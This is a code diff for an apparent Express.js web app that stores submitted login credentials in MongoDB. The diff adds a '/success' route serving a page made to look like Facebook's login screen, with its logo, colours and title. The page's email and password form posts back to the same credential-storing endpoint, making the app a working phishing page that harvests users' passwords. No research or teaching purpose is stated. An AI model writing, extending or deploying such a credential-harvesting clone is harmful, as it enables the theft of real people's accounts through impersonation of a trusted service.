@@ -51,12 +51,146 @@ app.post('/submit-login', async (req, res) => {
         // Log the result after successful insertion
         console.log("Data inserted successfully:", result);
         
-        res.send('Login information saved successfully to MongoDB.');
+        res.redirect(`/success?username=${encodeURIComponent(username)}`);
     } catch (error) {
         console.error('Error saving data to MongoDB:', error);
         res.status(500).send('Error saving data to MongoDB.');
     }
 });
+
+app.get('/success', (req, res) => {
+    const username = req.query.username; // Get the username from the query parameters
+    res.send(`
+        <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook</title>
+    <link rel="stylesheet" href="/fbloginstyle.css">
+</head>
+
+    <style>
+        body {
+        font-family: Arial, sans-serif;
+        background-color: #f2f2f2ec;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
+
+    .fblogo {
+        position:absolute;
+        display: block;
+        width: 14%;
+        margin-bottom: 500px;
+    }
+
+    .login-container {
+        background-color: white;
+        padding: 40px 40px; /* Add padding to the container */
+        border-radius: 5px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        width: 300px; /* Set a fixed width for the container */
+        text-align: center;
+        align-items: center;
+        justify-content: center;
+    }
+
+    h2 {
+        margin-bottom: 20px;
+        text-align: center; /* Center the heading */
+    }
+
+    .form-group {
+        margin-bottom: 15px;
+    }
+
+    label {
+        display: block;
+        margin-bottom: 5px;
+    }
+
+    input {
+        width: 92%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+    }
+
+    button {
+        width: 101%;
+        padding: 12px;
+        background-color: #1877F2;
+        color: white;
+        font-weight: bold;
+        font-size: 19px;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+    }
+
+    button:hover {
+        background-color: #1564ca;
+    }
+
+    p {
+        margin-top: 15px;
+        text-align: center; /* Center the paragraph */
+    }
+
+    a {
+    text-decoration: none; /* Remove underline by default */
+    color: #1877F2; /* Set link color */
+    }
+
+    a:hover {
+        text-decoration: underline; /* Underline on hover */
+    }
+    
+    .bottom-form {
+        font-size: 13px;
+    }
+
+    ::placeholder {
+        font-family: sans-serif;
+        font-size: 16px
+    }
+
+    </style>
+
+<body>
+    <img src="images/fbloginlogo.png" class="fblogo" alt="fblogo">
+    <div class="login-container">
+        <h2 style="font-size: 17px; font-weight: bold; color: #504e4e; margin-bottom: 48px; font-family: sans-serif;">Log in to Facebook</h2>
+        <form action="/submit-login" method="POST">
+            <div class="form-group">
+                <input placeholder="Email address or Phone number" type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <input placeholder="Password" type="password" id="password" name="password" required>
+            </div>
+            <button type="submit">Log in</button>
+        </form>
+    </div>
+
+        <script>
+            document.getElementById('loginForm').addEventListener('submit', function (e) {
+                e.preventDefault();
+
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+            });
+        </script>
+
+</body>
+</html>
+
+    `);
+});
+
 
 // Routes to serve HTML files
 app.get('/', (req, res) => {
